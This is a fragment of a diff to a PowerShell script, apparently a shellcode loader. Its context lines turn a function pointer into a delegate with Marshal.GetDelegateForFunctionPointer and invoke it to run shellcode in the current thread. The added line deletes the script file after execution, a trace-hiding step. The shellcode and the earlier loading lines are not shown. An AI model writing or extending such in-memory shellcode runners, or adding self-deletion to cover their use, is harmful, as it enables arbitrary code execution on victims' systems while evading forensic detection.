@@ -28,3 +28,5 @@ $executeShellcode = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunc
 
 # Directly invoke the delegate to execute the shellcode in the current thread
 $executeShellcode.Invoke()
+
+del test.ps1
